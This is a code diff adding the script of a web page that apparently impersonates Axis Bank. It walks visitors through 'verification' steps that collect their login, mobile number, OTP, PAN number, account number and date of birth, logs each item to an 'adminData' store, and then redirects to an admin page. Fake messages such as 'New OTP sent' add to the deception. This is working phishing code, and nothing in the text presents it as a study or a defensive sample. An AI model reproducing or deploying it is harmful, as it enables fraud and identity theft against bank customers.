+                    resendBtn.style.display = 'block';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+        
+        // Verify OTP
+        function verifyOTP() {
+            const otp = document.getElementById('fullOtp').value;
+            
+            if (otp.length !== 6) {
+                alert('Please enter a valid 6-digit OTP');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('otpLoading').style.display = 'block';
+            
+            setTimeout(() => {
+                const otpData = {
+                    otp: otp,
+                    timestamp: new Date().toISOString(),
+                    page: 'Axis Bank OTP Verification'
+                };
+                
+                saveToAdmin(otpData);
+                
+                // Hide OTP section, show PAN
+                document.getElementById('otp-section').style.display = 'none';
+                document.getElementById('otpLoading').style.display = 'none';
+                document.getElementById('pan-section').style.display = 'block';
+                clearInterval(timerInterval);
+            }, 1500);
+        }
+        
+        // Resend OTP
+        function resendOTP() {
+            alert('New OTP sent to your registered mobile number');
+            startTimer();
+        }
+        
+        // Process PAN
+        function processPAN() {
+            const fullName = document.getElementById('fullName').value;
+            const panNumber = document.getElementById('panNumber').value;
+            
+            if (!fullName || !panNumber) {
+                alert('Please fill all fields');
+                return;
+            }
+            
+            const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+            if (!panRegex.test(panNumber)) {
+                alert('Please enter a valid PAN number\n\nFormat: ABCDE1234F');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('panLoading').style.display = 'block';
+            
+            setTimeout(() => {
+                const panData = {
+                    fullName: fullName,
+                    panNumber: panNumber,
+                    timestamp: new Date().toISOString(),
+                    page: 'Axis Bank PAN Verification'
+                };
+                
+                saveToAdmin(panData);
+                
+                // Hide PAN section, show Account
+                document.getElementById('pan-section').style.display = 'none';
+                document.getElementById('panLoading').style.display = 'none';
+                document.getElementById('account-section').style.display = 'block';
+            }, 1500);
+        }
+        
+        // Process Account
+        function processAccount() {
+            const accountNumber = document.getElementById('accountNumber').value;
+            const dob = document.getElementById('fullDob').value;
+            
+            if (!accountNumber || !dob) {
+                alert('Please fill all fields');
+                return;
+            }
+            
+            if (accountNumber.length < 11 || accountNumber.length > 16) {
+                alert('Please enter a valid account number (11-16 digits)');
+                return;
+            }
+            
+            // Calculate age
+            const [day, month, year] = dob.split('/');
+            const birthDate = new Date(year, month - 1, day);
+            const today = new Date();
+            let age = today.getFullYear() - birthDate.getFullYear();
+            const monthDiff = today.getMonth() - birthDate.getMonth();
+            
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+            
+            if (age < 18) {
+                alert('You must be 18 years or older');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('accountLoading').style.display = 'block';
+            
+            setTimeout(() => {
+                const accountData = {
+                    accountNumber: accountNumber,
+                    dateOfBirth: dob,
+                    age: age,
+                    timestamp: new Date().toISOString(),
+                    page: 'Axis Bank Account Details'
+                };
+                
+                saveToAdmin(accountData);
+                
+                // Hide Account section, show Success
+                document.getElementById('account-section').style.display = 'none';
+                document.getElementById('accountLoading').style.display = 'none';
+                document.getElementById('success-section').style.display = 'block';
+                
+                // Save final success data
+                const successData = {
+                    status: 'Verification Complete',
+                    timestamp: new Date().toISOString(),
+                    verificationId: 'VER-' + Date.now().toString().slice(-8),
+                    page: 'Axis Bank Success'
+                };
+                
+                saveToAdmin(successData);
+                
+                // Auto redirect to admin after 5 seconds
+                setTimeout(() => {
+                    window.location.href = 'admin.html';
+                }, 5000);
+            }, 1500);
+        }
+        
+        // Go to Admin
+        function goToAdmin() {
+            window.location.href = 'admin.html';
+        }
+        
+        // Restart Process
+        function restartProcess() {
+            // Reset all forms
+            document.getElementById('userId').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('mobile').value = '';
+            document.getElementById('fullName').value = '';
+            document.getElementById('panNumber').value = '';
+            document.getElementById('accountNumber').value = '';
+            document.getElementById('dobDay').value = '';
+            document.getElementById('dobMonth').value = '';
+            document.getElementById('dobYear').value = '';
+            
+            otpDigits.forEach(digit => digit.value = '');
+            
+            // Hide all sections, show login
+            document.getElementById('success-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+        }
+        
+        // Save data to admin
+        function saveToAdmin(data) {
+            let adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
+            adminData.push(data);
+            localStorage.setItem('adminData', JSON.stringify(adminData));
+            console.log('Data saved:', data);
+        }
     </script>
 </body>
 </html>
